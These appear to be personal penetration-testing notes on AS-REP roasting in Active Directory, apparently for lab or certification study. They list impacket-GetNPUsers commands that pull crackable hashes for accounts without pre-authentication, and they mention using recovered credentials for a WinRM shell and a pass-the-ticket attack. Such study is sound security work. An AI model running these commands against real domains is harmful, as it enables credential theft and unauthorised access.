AS-REP-Roasting
[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- Pre-authenticated users using GetUserSPNs
    
    - users can be found using ldapsearch and rpc
    
![[../assets/Pre-auth Users/image 225.png|image 225.png]]
```JavaScript
impacket-GetNPUsers <DOMAIN/user> -dc-ip <DC_IP> -request
```
- remember the slash at the end of domain
- don’t need a user list for this one apparently
  
Putting users through [GetNPUsers.py](http://GetNPUsers.py) will check if there are any pre-auth users
- if there are, it will give you a hash
    
    ![[/image 1 163.png|image 1 163.png]]
    
if the command above doesn’t work, try this one
- [GetNPUsers.py](http://getnpusers.py/) <DOMAIN>/ -usersfile userfile.txt -dc-ip <IP> -no-pass
![[/image 2 143.png|image 2 143.png]]
![[/image 3 127.png|image 3 127.png]]
  
With this pre-authenticated user creds, we can get a shell on port 5985
  
  
Can also get a ticket from TGT using GetNPUsers
- impacket-GetNPUsers -dc-ip <IP> <DOMAIN/<user> -no-pass
- impacket-GetNPUsers -dc-ip <IP> <DOMAIN/<user>
    
    - give it password
    
- could use this ticket to do a pass the ticket attack
    
    - can use that ticket for 10 hours (default on windows)
    
  
  
If you want to request from an authenticated user
- impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
  
If you want to request using kerberos authentication
- impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<user> -k -request -format hashcat -outputfile hashes.asreproast -dc-host <NetBIOS>
    
    - may not need -dc-host option (need it when NTLM is disabled)